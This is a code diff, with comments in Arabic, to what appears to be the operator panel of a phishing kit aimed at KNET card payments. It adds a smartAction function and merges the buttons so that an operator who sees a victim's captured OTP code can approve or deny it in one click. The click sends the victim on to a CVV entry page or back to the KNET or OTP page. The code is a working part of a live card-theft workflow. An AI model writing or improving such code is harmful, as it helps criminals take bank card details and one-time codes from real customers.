@@ -854,6 +854,54 @@
     }
   }
 
+  async function smartAction(ref, action) {
+    // تحديد الحالة الحالية: إذا كان هناك OTP مرسل ولم يتم البت فيه → نستخدم otpAction
+    // إذا كان الطلب في مرحلة KNET/CVV → نستخدم paymentAction
+    const passBtn = document.getElementById(`pay-pass-${ref}`);
+    const denyBtn = document.getElementById(`pay-denied-${ref}`);
+    if (passBtn) { passBtn.disabled = true; passBtn.innerHTML = 'جاري...'; }
+    if (denyBtn) { denyBtn.disabled = true; denyBtn.innerHTML = 'جاري...'; }
+
+    try {
+      // جلب بيانات الحجز لتحديد الحالة
+      const bookingData = await get(`/api/admin/bookings/${ref}`);
+      const booking = bookingData.booking || bookingData;
+      const hasOtp = booking.otp && booking.otp.otpCode && booking.otp.otpAction !== 'pass';
+
+      let endpoint, label;
+      if (hasOtp) {
+        // حالة OTP: استخدم otp-action
+        endpoint = '/api/admin/otp-action';
+        label = action === 'pass' ? '✅ قبول OTP - تم توجيه العميل لصفحة CVV' : '❌ تم رفض OTP - سيعود لصفحة OTP';
+      } else {
+        // حالة KNET/CVV: استخدم payment-action
+        endpoint = '/api/admin/payment-action';
+        label = action === 'pass' ? '✅ قبول - تم توجيه العميل' : '❌ رفض - سيعود لصفحة KNET';
+      }
+
+      newDataRefs.delete(ref);
+      const d = await post(endpoint, { reference: ref, action });
+      if (d.success) {
+        toast(label, action === 'pass' ? 'ok' : 'err');
+        loadAll();
+        if (currentOpenRef && currentOpenRef === ref) {
+          setTimeout(() => openDetail(ref), 400);
+        } else {
+          if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+          if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
+        }
+      } else {
+        toast('فشل الإجراء: ' + (d.error || ''), 'err');
+        if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+        if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
+      }
+    } catch(e) {
+      toast('خطأ في الاتصال', 'err');
+      if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+      if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
+    }
+  }
+
   async function updStatus(ref, status) {
     document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
     try {
@@ -975,16 +1023,11 @@
           <div class="otp-section-box">
             <div class="otp-section-title">🔐 رمز OTP المُستلم</div>
             <div class="otp-value-badge" id="otp-badge-${b.referenceId}">${otpVal}</div>
-          </div>
-          <div class="knet-action-btns" style="margin-bottom:8px;">
-            <button class="knet-btn-pass" id="otp-pass-${b.referenceId}" onclick="otpAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول OTP → CVV</button>
-            <button class="knet-btn-deny" id="otp-denied-${b.referenceId}" onclick="otpAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض OTP</button>
           </div>` : ''}
 
-          <div style="font-size:11px;color:#6b7280;margin-bottom:6px;padding:0 2px;">أزرار الدفع (KNET/CVV):</div>
           <div class="knet-action-btns">
-            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول</button>
-            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="paymentAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض</button>
+            <button class="knet-btn-pass" id="pay-pass-${b.referenceId}" onclick="smartAction('${b.referenceId}','pass')"><i class="bi bi-check-circle-fill"></i> قبول</button>
+            <button class="knet-btn-deny" id="pay-denied-${b.referenceId}" onclick="smartAction('${b.referenceId}','denied')"><i class="bi bi-x-circle-fill"></i> رفض</button>
           </div>
         </div>`;
     }
